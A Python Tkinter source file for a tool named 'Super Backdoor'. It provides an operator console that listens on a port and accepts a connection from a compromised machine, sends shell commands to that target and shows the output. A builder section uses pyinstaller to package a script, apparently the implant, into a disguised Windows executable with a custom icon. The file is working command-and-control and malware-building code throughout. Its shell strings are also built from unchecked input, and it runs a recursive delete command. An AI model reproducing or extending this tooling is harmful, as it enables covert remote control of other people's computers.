#!C:\python34\python.exe
import os
import time
import ctypes
from tkinter import *
from threading import Thread
from socket import socket

background_color = 'gainsboro'

class SuperBackdoor(object):
	def __init__(self):
		#configura a tela padrao
		self.root = Tk()
		self.root.title('Super Backdoor')
		self.root.geometry('800x500')
		self.background_color = background_color
		self.root.configure(background=background_color)

		#self.matrix_foto = PhotoImage(file='matrix.gif')
		#self.back = Label(self.root); self.back['image']=self.matrix_foto; self.back.place(x=0, y=0, relwidth=1, relheight=1)#self.back.pack()

		self.frame_botoes_menu = Frame(self.root,bg=background_color); self.frame_botoes_menu.pack(); self.frame_botoes_menu_packed = True

		#cria os botoes do menu
		self.botao_configurar = Button(self.frame_botoes_menu,text="Configure",width=28,bg='light gray',font=('Verdana',10,'bold'),padx=2,command=self.configure_backdoor)
		self.botao_compilar_b = Button(self.frame_botoes_menu,text="Compile To Exe",width=28,bg='light gray',font=('Verdana',10,'bold'),pady=2,command=self.area_compilar)
		self.botao_escutar = Button(self.frame_botoes_menu,text="Listener",width=29,bg='light gray',font=('Verdana',10,'bold'),padx=2,command=self.escutar_backdoor)

		self.botao_configurar.grid(row=0,column=0)
		self.botao_compilar_b.grid(row=0,column=1)
		self.botao_escutar.grid(row=0,column=2)

		self.area_compilar_packed = self.frame_conf_packed = self.frame_start_escuta_packed  = self.frame_return_b_packed = self.frame_listen_entrada_packed = self.button_return_packed = self.frame_comandos_terminal_packed = False

		self.root.mainloop()

	def mensagem(self,title,msg):
		#cria as mensagens de erro
		ctypes.windll.user32.MessageBoxW(0, msg, title, 1)

	def configure_backdoor(self): 
		#area do botao configurar
		self.botao_configurar.configure(bg='lavender'); self.botao_compilar_b.configure(bg='light gray'); self.botao_escutar.configure(bg='light gray')
		self.frame_conf = Frame(self.root); self.frame_conf.pack()
		self.frame_conf_packed = True
		Label(self.frame_conf,text='jooj').grid(row=0,column=0)

	def escutar_backdoor(self):
		#area do botao listener
		background_color = 'springgreen4'
		
		if not self.frame_botoes_menu_packed: self.frame_botoes_menu.pack(); self.frame_botoes_menu_packed=True
		#if self.button_return_packed:
			
		#	self.frame_listen_entrada.pack()
		#	self.frame_start_escuta.pack_forget()
			

		if self.frame_start_escuta_packed: return
		if self.button_return_packed: return


		self.root.configure(background=background_color)
		self.botao_escutar.configure(bg='lavender'); self.botao_configurar.configure(bg='light gray'); self.botao_compilar_b.configure(bg='light gray')

		if self.frame_conf_packed:
			self.frame_conf.pack_forget()
			self.frame_conf_packed=False
		if self.area_compilar_packed:
			self.frame_compilar.pack_forget()
			self.area_compilar_packed=False

		self.frame_start_escuta = Frame(self.root,bg=background_color); self.frame_start_escuta.pack()
		self.frame_start_escuta_packed = True
		self.frame_botoes_menu.config(bg=background_color)

		Label(self.frame_start_escuta,text="Ip para escutar: ",font=('Verdana',11,'bold'),pady=16,bg=background_color).grid(row=0,column=0)
		self.ip = Entry(self.frame_start_escuta,width=55,font=('Verdana',10)); self.ip.grid(row=0,column=1)
		self.ip.insert('end','127.0.0.1')
		Label(self.frame_start_escuta,width=10,bg=background_color).grid(row=0,column=2); #Label(self.frame_start_escuta,width=10,bg=background_color).grid(row=0,column=3)

		Label(self.frame_start_escuta,width=1,bg=background_color).grid(row=1,column=0);

		Label(self.frame_start_escuta,text="Porta: ",font=('Verdana',11,'bold'),bg=background_color,width=8,padx=0).grid(row=1,column=0)
		self.porta = Entry(self.frame_start_escuta,width=55,font=('Verdana',10)); self.porta.grid(row=1,column=1)
		self.porta.insert('end','443')

		Label(self.frame_start_escuta,height=1,bg=background_color).grid(row=2,column=1)
		self.check_socket = (lambda : Thread(target=self.start_socket).start())
		self.check_socket_b = (lambda event: self.check_socket())

		self.botao_listen = Button(self.frame_start_escuta,text="Start Listen",bg='light gray',font=('motiva sans',12,'bold'),pady=3,border=3,command=self.check_socket); 
		self.botao_listen.grid(row=3,column=1)
		self.root.bind('<Return>',self.check_socket_b)
		#self.botao_listen.config(highlightbackground='light gray')

	def receive_user_entry(self,line):
		user = self.connection.recv(1024).decode()
		Label(self.frame_listen_entrada,text=user,bg='black',fg='white',width=15,anchor='w',font=('Arial',10,'bold'),padx=5).grid(row=line,column=0,sticky='w')
		self.comando = Entry(self.frame_listen_entrada,bg='black',width=200,fg='white',border=0.3,font=('Arial',10,'bold')); self.comando.grid(row=line,column=1,sticky='w')
		self.comando.config(highlightbackground='gray2')
		self.comando.focus()

		Label(self.frame_start_escuta,width=15,bg=background_color,height=10).grid(row=line,column=2,sticky='w')

	def return_command(self,event):
		if len(self.all_commands_list)<2: return

		self.comando_cont-=1
		self.all_commands_list[self.comando_cont]

		#atual = 
		#after = self.all_commands_list[]
		#ult_cont = int('-'+str(self.comando_cont))

		#ult_comando = self.all_commands_list[ult_cont]
		#self.comando.delete(0,'end')
		#self.comando.insert('end',atual)

	def start_terminal(self):
		#inicia a tela preta para interagir com o alvo

		#Label(self.frame_start_escuta,width=30,bg='red').place(x=300,y=450);
		
		#Label(self.frame_compilar,width=2,bg=background_color).grid(row=1,column=2) #label para espaçamento com o botao

		if self.frame_start_escuta_packed: self.frame_start_escuta.pack_forget()
		self.frame_start_escuta_packed = False

		self.root.title('Terminal')
		self.root.configure(background='black')

		self.frame_listen_entrada = Frame(self.root,bg='black'); self.frame_listen_entrada.pack()
		self.frame_listen_entrada_packed = True
			
		self.receive_user_entry(0)

		self.all_commands_list = []

		if self.frame_botoes_menu_packed: self.frame_botoes_menu.pack_forget(); self.frame_botoes_menu_packed=False
		#self.comando = Entry(self.frame_listen_entrada,bg='black',width=200,fg='white',border=0,font=('Arial',10,'bold')); self.comando.grid(row=0,column=1)
		
		send_command_lambda = (lambda event: self.send_command())
		
		self.root.bind('<Return>',send_command_lambda)
		#self.root.bind('<Up>',self.return_command)

		self.frame_comandos_terminal = Frame(self.root,bg='black'); self.frame_comandos_terminal.pack()
		self.frame_comandos_terminal_packed = True

		self.frame_return_b = Frame(self.root,width=650); self.frame_return_b.pack(side=BOTTOM,anchor='w'); self.frame_return_b_packed = True
		self.button_return = Button(self.frame_return_b,text='Return',font=('Verdana',9,'bold'),bg=background_color,command=self.unpack_terminal); self.button_return.pack(anchor='w')
		self.button_return_packed = True		

		self.frame_comandos_terminal = Frame(self.root,bg='black'); self.frame_comandos_terminal.pack()

		self.resp_label_packed = False

	def start_socket(self):
		#inicia o servidor socket para a conexao
		background_color = 'springgreen4'
		
		try: error_l.destroy()
		except: pass
		list_con = Label(self.frame_start_escuta,text='[*] Listening to Connections...',font=('Verdana',11,'bold'),bg=background_color,fg='red4'); list_con.grid(row=4,column=1)
		
		try:
			self.server = socket()
			self.server.settimeout(10)
			ip = self.ip.get()
			port = int(self.porta.get())

			self.server.bind((ip,port))
			self.server.listen(1)

			self.connection,host=self.server.accept()

			Label(self.frame_start_escuta,text='[*] Connected with %s'%host[0],font=('Verdana',11,'bold'),bg=background_color,fg='red4').grid(row=5,column=1)
			time.sleep(1.6)

			self.start_terminal()
			#self.connection.close()

		except Exception as er:

			print("erro aki o %s"%er)
			list_con.destroy()
			error_l = Label(self.frame_start_escuta,text='[!] %s'%str(er).title(),font=('Verdana',11,'bold'),bg=background_color,fg='red4'); error_l.grid(row=4,column=1)
			self.mensagem('Error',str(er).title())
			self.unpack_terminal()

	def send_command(self):
		#envia os comandos do terminal ao pressionar enter
		try:
			self.env_comando = self.comando.get()

			self.frame_comandos_terminal.pack_forget()

			if self.env_comando=='': return
			elif self.env_comando=='exit': 
				self.mensagem('Server','[!] Closed'); self.unpack_terminal(); return
			elif self.env_comando=='refresh':
				try:
					while True:
						self.connection.settimeout(1)
						self.connection.recv(1024)
				except:
					self.connection.settimeout(10)

			self.connection.send(self.env_comando.encode())
			
			#self.all_commands_list.append(self.env_comando)

			self.resp_comando = self.connection.recv(1024).decode().strip()
			print(self.resp_comando)

			if self.resp_label_packed: 
				self.resp_label_packed = False

			self.resp_label_packed = True
			self.comando.delete(0,'end')

			if self.resp_comando!='' and self.resp_comando.count('[!] command could not be executed')<=1:
				'''
				list_comando = self.resp_comando.split()+[' ' for i in range(20-len(self.resp_comando.split()))]

				if len(list_comando)<=20:
					self.frame_comandos_terminal.pack_forget()
					#list_comando = self.resp_comando.split()+[' ' for i in range(15-len(l))]

					for i in range(1,len(list_comando)+1):
						if list_comando[i-1]=='':
							Label(self.frame_comandos_terminal,text=list_comando[i-1],bg='black',fg='black',anchor='w',font=('Arial',10,'bold')).grid(row=i,column=0,sticky='w')
						else:
							Label(self.frame_comandos_terminal,text=list_comando[i-1],bg='black',fg='white',anchor='w',font=('Arial',10,'bold')).grid(row=i,column=0,sticky='w')
				'''
					#self.frame_comandos_terminal.pack()	
	
				self.mensagem('Resp',self.resp_comando)

		except Exception as er: self.mensagem('Error',str(er))

	def unpack_terminal(self):
		#funcao do botao retornar, que desenpacota o terminal e volta para a tela verde padrao
		background_color = 'gainsboro'; self.root.configure(bg=background_color)
		if self.frame_listen_entrada_packed:
			self.frame_listen_entrada.pack_forget()
			self.frame_listen_entrada_packed=False

		if self.frame_return_b_packed:
			self.frame_return_b.pack_forget()
			self.frame_return_b_packed=False

		if self.button_return_packed:
			self.button_return.pack_forget(); self.button_return_packed = False

		#self.frame_listen_entrada.pack_forget()
		if self.frame_comandos_terminal_packed:	self.frame_comandos_terminal.pack_forget(); self.frame_comandos_terminal_packed=True

		try: self.connection.close(); self.server.close()
		except: pass
		
		if not self.frame_botoes_menu_packed: self.frame_botoes_menu.pack(); self.frame_botoes_menu_packed=True

		self.escutar_backdoor()

	def area_compilar(self): 
		#configura a area do botao compilar
		if self.button_return_packed: return

		if not self.frame_botoes_menu_packed: self.frame_botoes_menu.pack(); self.frame_botoes_menu_packed=True

		self.botao_compilar_b.configure(bg='lavender'); self.botao_escutar.configure(bg='light gray'); self.botao_configurar.configure(bg='light gray')

		if self.area_compilar_packed: return

		if self.frame_listen_entrada_packed:
			self.frame_listen_entrada.pack_forget()
			self.frame_listen_entrada_packed=False

		if self.frame_start_escuta_packed:
			self.frame_start_escuta.pack_forget()
			self.frame_start_escuta_packed=False

		self.root.configure(background=self.background_color)

		self.frame_compilar = Frame(self.root,bg=background_color); self.frame_compilar.pack()

		Label(self.frame_compilar,text="Icone do Executavel: ",font=('Verdana',11,'bold'),pady=16,bg=background_color).grid(row=0,column=0)
		self.icone = Entry(self.frame_compilar,width=50,font=('Verdana',10)); self.icone.grid(row=0,column=1)
		self.icone.insert('end','None')

		Label(self.frame_compilar,text="Caminho do arquivo: ",font=('Verdana',11,'bold'),bg=background_color).grid(row=1,column=0)
		self.arquivo = Entry(self.frame_compilar,width=50,font=('Verdana',10)); self.arquivo.grid(row=1,column=1)
		self.arquivo.insert('end',os.getcwd())
		Label(self.frame_compilar,width=2,bg=background_color).grid(row=1,column=2) #label para espaçamento com o botao

		self.botao_compilar = Button(self.frame_compilar,text='Compilar',font=('Verdana',10,'bold'),height=1,width=8,border=3,command=self.gera_exe)
		self.botao_compilar.grid(row=1,column=4)
		self.exe_packed = self.frame_exe_packed = False #variaveis para checar o empacotamento.

		clicked = (lambda event: self.gera_exe())
		self.root.bind('<Return>',clicked)

		self.nome = ''
		self.area_compilar_packed = True

	def gera_exe(self):
		#funcao para gerar o executavel.

		#if self.exe_packed: return # and self.nome==self.arquivo.get(): return

		if self.frame_exe_packed: 
			self.frame_exe.pack_forget()

		self.frame_exe = Frame(self.root,bg=background_color); self.frame_exe.pack(); self.frame_exe_packed = True
		self.nome = self.arquivo.get()

		if 'executavel' not in os.listdir('.'):
			os.mkdir('executavel')

		os.chdir('executavel')

		def exe_func(): 
			#gera o executavel parte 2
			gerou_exe = False
			exe_name = os.path.basename(self.nome).split('.')[0]+'.exe'

			str_compile=self.nome
			icon=self.icone.get()

			if icon=='None' or icon=='': pass
			elif os.path.isfile(icon) and icon.endswith('.ico'):
				str_compile+='" '+'-i '+'"'+icon
		
			elif not icon.endswith('.ico'):
				self.mensagem('IconError','Icone precisa terminar com .ico')
				self.icone.delete(0,'end')
				self.icone.insert('end','None')
				return
			else:
				self.mensagem('IconError','Nome do icone invalido!')
				self.icone.delete(0,'end')
				self.icone.insert('end','None')
				return
			print(str_compile)

			Label(self.frame_exe,text='[*] Gerando Executavel...',fg='forest green',font=('Verdana',11,'bold'),bg=background_color).grid(row=0,column=1)

			os.popen('del executavel\\%s 2> nul'%exe_name)
			os.popen('pyinstaller --onefile "%s" 2> ..\pyinstaller_output.txt & move dist\\* . & rmdir /s /q build dist 2> nul & del *.spec 2> nul'%str_compile).read()
			
			os.chdir('..')

			if exe_name in os.listdir('executavel') and os.path.isfile(self.nome): gerou_exe=True

			if gerou_exe:
				Label(self.frame_exe,text='[*] Executavel salvo em %s'%os.getcwd()+'\\executavel',fg='forest green',font=('Verdana',11,'bold'),bg=background_color).grid(row=1,column=1)
				os.popen('del /s e').read()
			else:
				Label(self.frame_exe,text='[!] Erro ao criar o executavel.',fg='firebrick2',font=('Verdana',11,'bold'),bg=background_color).grid(row=1,column=1)
				er = open('pyinstaller_output.txt').readlines()[-1]
				title = er[:er.index(':')].strip() 
				error = er[er.index(':')+1:].strip().title()
				self.mensagem(title,error)

		t = Thread(target=exe_func)
		t.start()

		self.exe_packed = True
		return

if __name__=='__main__': SuperBackdoor()